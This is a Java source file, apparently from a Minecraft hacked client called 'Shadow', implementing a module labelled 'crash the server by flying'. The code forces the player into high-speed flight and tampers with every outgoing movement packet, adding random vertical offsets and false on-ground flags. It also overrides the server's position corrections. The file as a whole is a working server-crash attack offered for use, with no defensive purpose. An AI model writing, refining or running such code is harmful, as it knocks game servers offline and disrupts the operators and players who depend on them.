package net.shadow.feature.module;

import net.minecraft.client.network.ClientPlayerEntity;
import net.minecraft.network.Packet;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;
import net.minecraft.network.packet.c2s.play.TeleportConfirmC2SPacket;
import net.minecraft.network.packet.s2c.play.PlayerPositionLookS2CPacket;
import net.minecraft.util.math.Vec3d;
import net.minecraft.world.World;
import net.shadow.Shadow;
import net.shadow.event.events.PacketInput;
import net.shadow.event.events.PacketOutput;
import net.shadow.feature.base.Module;
import net.shadow.feature.base.ModuleType;
import net.shadow.feature.configuration.SliderValue;
import net.shadow.mixin.PlayerMovePacketMixin;
import net.shadow.mixin.PlayerPositionLookPacketMixin;
import net.shadow.plugin.Notification;
import net.shadow.plugin.NotificationSystem;
import net.shadow.utils.Utils;

import java.util.Random;

public class ChunksCrashModule extends Module implements PacketOutput, PacketInput {
    static World w;
    static boolean shouldfly;
    static int ppls;
    static int ticks;
    final SliderValue velocity = this.config.create("Velocity", 1, 1, 10, 0);
    final SliderValue timer = this.config.create("Boost", 1, 1, 10, 1);
    final SliderValue lockat = this.config.create("Lockat", 20, 20, 500, 0);

    public ChunksCrashModule() {
        super("ChunkRender", "crash the server by flying", ModuleType.CRASH);
    }

    @Override
    public String getVanityName() {
        return this.getName() + "Crash";
    }


    @Override
    public void onEnable() {
        shouldfly = true;
        w = Shadow.c.player.clientWorld;
        Shadow.getEventSystem().add(PacketOutput.class, this);
        Shadow.getEventSystem().add(PacketInput.class, this);
    }

    @Override
    public void onDisable() {
        Shadow.getEventSystem().remove(PacketOutput.class, this);
        Shadow.getEventSystem().remove(PacketInput.class, this);
    }

    @Override
    public void onUpdate() {
        ClientPlayerEntity player = Shadow.c.player;
        ticks++;
        Shadow.c.player.setSprinting(true);
        Vec3d forward = Vec3d.fromPolar(0, player.getYaw()).normalize();
        if (Shadow.c.player.getY() < lockat.getThis()) {
            player.setVelocity(0, 0.3, 0);
        } else {
            if (shouldfly) {
                Shadow.c.options.forwardKey.setPressed(true);
                player.setVelocity(forward.x * velocity.getThis(), 0, forward.z * velocity.getThis());
            } else {
                Shadow.c.options.forwardKey.setPressed(false);
            }
        }
        if (ticks % 200 == 0) {
            ppls = 0;
        }
    }

    @Override
    public void onRender() {

    }

    @Override
    public void onSentPacket(PacketOutputEvent event) {
        if(event.getPacket() instanceof PlayerMoveC2SPacket packet){
            ((PlayerMovePacketMixin)packet).setOnGround(false);
            ((PlayerMovePacketMixin)packet).setY(packet.getY(0) + randomboolnum());
        }
    }

    private double randomboolnum() {
        if (new Random().nextBoolean()) {
            return Math.random() * 2;
        } else {
            return Math.random() * -2;
        }
    }

    @Override
    public String getSpecial() {
        return timer.getThis() + "";
    }

    @Override
    public void onReceivedPacket(PacketInputEvent event) {
        if (event.getPacket() instanceof PlayerPositionLookS2CPacket packet) {
            ((PlayerPositionLookPacketMixin)packet).setPitch(Shadow.c.player.getPitch());
            ((PlayerPositionLookPacketMixin)packet).setYaw(Shadow.c.player.getYaw());
        }
    }
}

